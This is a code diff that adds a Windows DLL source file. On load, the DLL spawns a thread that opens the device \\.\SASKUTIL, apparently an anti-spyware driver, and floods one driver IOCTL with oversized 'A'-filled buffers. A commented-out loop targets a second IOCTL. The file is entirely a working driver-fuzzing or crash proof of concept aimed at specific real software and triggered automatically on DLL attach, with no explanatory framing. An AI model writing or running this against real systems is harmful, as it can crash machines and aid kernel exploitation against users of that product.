@@ -1,0 +1,88 @@
+// dllmain.cpp : Defines the entry point for the DLL application.
+#include "stdafx.h"
+#include <Windows.h>
+
+
+
+
+void DbgPrintA(LPCSTR lpszFormat, ...)
+{
+	va_list   args;
+	CHAR     szBuffer[0x4000];
+	va_start(args, lpszFormat);
+	wvsprintfA(szBuffer, lpszFormat, args);
+	OutputDebugStringA(szBuffer);
+	va_end(args);
+
+}
+
+
+
+void fuzz_s(HANDLE m_handle, DWORD dwIOCTL)
+{
+	DWORD nbBytes = 0;
+
+	char dw01[0x5] = {0};
+	char szBuf[0x100] = {0};
+	char szOutBuf[0x100] = {0};
+	memset(szBuf, 0x41, 0x100);
+	memset(dw01, 0x31, 0x5);
+
+	for (int iCount = 0xFFFF; 1 < iCount; iCount-- )
+	{
+		char *pSendBuf = new char[iCount];
+		char *pOutBuf = new char[iCount];
+		memset(pSendBuf, 0x41, iCount);
+
+		if (iCount > 0x10)
+		{
+			*(DWORD *)pSendBuf = iCount;
+
+		}
+
+		DeviceIoControl(m_handle, dwIOCTL, (LPVOID)pSendBuf, iCount, (LPVOID)pOutBuf, iCount, &nbBytes, NULL);
+		delete[] pSendBuf;
+		delete[] pOutBuf;
+	}
+
+	return ;
+}
+
+
+void fuzz()
+{
+	DWORD nbBytes = 0;
+	HANDLE hDriver = CreateFileA("\\\\.\\SASKUTIL",GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+// 	char szbuf[0x42684] = {0x0};
+// 	memset(szbuf, 0x41, 0x42684);
+// 	while (1)
+// 	{
+// 		DeviceIoControl(hDriver, 0x9C40204c, (LPVOID)szbuf, 0, (LPVOID)0, 0, &nbBytes, NULL);
+// 	}
+	
+	
+
+	fuzz_s(hDriver, 0x9C402080);
+}
+
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+					 )
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		{
+			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)fuzz, NULL, NULL, NULL);
+			break;
+		}
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+
